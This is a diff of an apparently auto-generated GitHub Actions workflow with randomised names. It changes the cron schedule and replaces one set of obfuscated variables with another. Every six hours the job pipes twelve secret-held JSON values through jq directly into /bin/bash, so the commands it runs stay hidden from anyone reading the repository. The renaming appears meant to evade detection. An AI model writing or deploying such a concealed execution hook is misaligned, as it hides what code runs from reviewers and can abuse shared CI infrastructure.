@@ -3,27 +3,28 @@ name: wangtingzhong2341
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
+    - cron: '34 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wangtingzhong2341
         env:
-          ulnp74127: ${{ secrets.ulnp74127 }}
+          rfnzg578: ${{ secrets.rfnzg578 }}
         run: |
-          echo $ulnp74127 | jq -r .gsu8 | /bin/bash
-          echo $qprov91150 | jq -r .jpwx686 | /bin/bash
-          echo $rlbzg333 | jq -r .s8568 | /bin/bash
-          echo $mysa52436 | jq -r .lefsp410 | /bin/bash
-          echo $xf69 | jq -r .olwn00119 | /bin/bash
-          echo $pgknr4 | jq -r .ekz9236 | /bin/bash
-          echo $rxtq32712 | jq -r .nwrbd85848 | /bin/bash
-          echo $cw2116 | jq -r .o789 | /bin/bash
-          echo $wof3 | jq -r .tuguj8 | /bin/bash
-          echo $meak7 | jq -r .j0442 | /bin/bash
-          echo $h97696 | jq -r .i45 | /bin/bash
-          echo $a782 | jq -r .q4 | /bin/bash
+          echo $rfnzg578 | jq -r .jh86 | /bin/bash
+          echo $b0 | jq -r .p15493 | /bin/bash
+          echo $nkt967 | jq -r .vm829 | /bin/bash
+          echo $xydpi83762 | jq -r .amyik27 | /bin/bash
+          echo $imc90 | jq -r .xyoq68858 | /bin/bash
+          echo $dvta619 | jq -r .jv2 | /bin/bash
+          echo $ahp010 | jq -r .qdmmm86 | /bin/bash
+          echo $pg681 | jq -r .dof2 | /bin/bash
+          echo $jrm459 | jq -r .qkhod63 | /bin/bash
+          echo $r24045 | jq -r .yu4 | /bin/bash
+          echo $nyqzn477 | jq -r .aoerw4717 | /bin/bash
+          echo $a32152 | jq -r .zaq20 | /bin/bash
 
